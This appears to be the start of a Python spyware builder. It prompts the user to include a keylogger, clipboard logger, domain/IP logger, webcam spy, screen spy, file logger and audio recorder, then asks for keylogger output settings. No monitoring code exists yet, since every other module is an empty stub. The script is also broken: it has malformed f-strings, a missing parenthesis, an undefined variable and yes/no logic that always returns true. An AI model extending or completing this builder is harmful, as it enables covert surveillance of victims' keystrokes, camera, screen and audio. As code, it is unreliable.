#!/usr/bin/env python3
import configparser
from io import StringIO
from colorama import Fore, Style, init

init(autoreset=True)

print(f"{Fore.GREEN}{Style.BRIGHT}Generating SpyWare...")

include_KeyLogger = str(input(f"{Fore.WHITE}{Style.BRIGHT}Include KeyLogger?: "))
include_ClipboardLogger = str(input(f"{Fore.WHITE}{Style.BRIGHT}Include ClipboardLogger?: "))
include_DomainsLogger = str(input(f"{Fore.WHITE}{Style.BRIGHT}Include Domains/IP Logger?: "))
include_WebcamSpy = str(input(f"{Fore.WHITE}{Style.BRIGHT}Include Webcam Spy?: "))
include_ScreenSpy = str(input(f"{Fore.WHITE}{Style.BRIGHT}Include Screen Spy?: "))
include_FilesLogger = str(input(f"{Fore.WHITE}{Style.BRIGHT}Include File Logger?: "))
include_AudioRecorder = str(input(f"{Fore.WHITE}{Style.BRIGHT}Include Audio Recorder?: "))

def option(spyware_input):
    if spyware_input == "yes".strip().upper() or "1".strip().upper() or "y".strip().upper():
        return True
    elif spyware_input == "no".strip().upper() or "0".strip() or "n".strip().upper():
        return False

def set_configs():
    print(f"{Fore.GREEN}{Style.BRIGHT}Setting custom configurations... ")
    if option(include_KeyLogger):
        print(f"Fore.GREEN}{Style.BRIGHT}Setting KeyLogger Configurations:")
        output_file = str(input(f"{Fore.WHITE}{Style.BRIGHT}Output logs filename (default is KeySpy.txt)?: ")
        event_press = str(input(f"(Fore.WHITE}(Style.BRIGHT}Include event pressed?: ")

    if option(include_ClipboardLogger):
        pass

    if option(include_DomainsLogger):
        pass

    if option(include_WebcamSpy):
        pass

    if option(include_ScreenSpy):
        pass

    if option(include_FilesLogger):
        pass

    if option(include_AudioLogger):
        pass


